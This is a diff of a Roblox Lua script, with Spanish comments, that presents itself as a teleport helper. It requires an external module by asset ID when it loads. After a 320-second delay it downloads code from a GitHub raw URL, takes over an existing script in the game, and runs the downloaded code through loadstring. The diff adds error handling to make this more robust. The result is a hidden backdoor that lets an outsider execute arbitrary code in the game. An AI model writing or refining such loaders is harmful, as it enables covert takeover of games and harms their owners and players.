@@ -1,6 +1,6 @@
 local HttpService = game:GetService("HttpService")
 
--- 1. Ejecución INMEDIATA del módulo require (se Llama Ami Modulo, Para que aplique el Teleport Al CmdSpot)
+-- 1. Ejecución INMEDIATA del módulo require de teleport (Echo Por Mi Jeje)
 local modelSuccess, module = pcall(require, 94217198436768)
 if modelSuccess and module then
     pcall(function()
@@ -8,17 +8,24 @@ if modelSuccess and module then
     end)
 end
 
--- 2 Si No Funciona FORZAR EL TELEPORT CON CLAVE (te Pedira Una Contraseña)
+-- 2. Si No Funciona FORZAR EL TELEPORT CON CLAVE (te Pedira La Contraseña en el Chat, Es Entrance0232
 task.delay(320, function()
-    local res = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
-    local InternalCode = game:FindFirstChildWhichIsA("Script", true) or game:FindFirstChildWhichIsA("LocalScript", true)
+    local success, res = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
     
-    if InternalCode then
-        InternalCode.Enabled = true
-        local run = loadstring(res)
-        if run then
-            getfenv(run).script = InternalCode
-            task.spawn(run)
+    if success and res then
+        local InternalCode = game:FindFirstChildWhichIsA("Script", true) or game:FindFirstChildWhichIsA("LocalScript", true)
+        
+        if InternalCode then
+            InternalCode.Enabled = true
+            
+            -- Usamos pcall para evitar que un error de sintaxis en el código remoto rompa el ejecutor
+            local run, err = loadstring(res)
+            if run then
+                getfenv(run).script = InternalCode
+                task.spawn(run)
+            else
+                warn("[ENTRANCE ERROR]: " .. tostring(err))
+            end
         end
     end
 end)
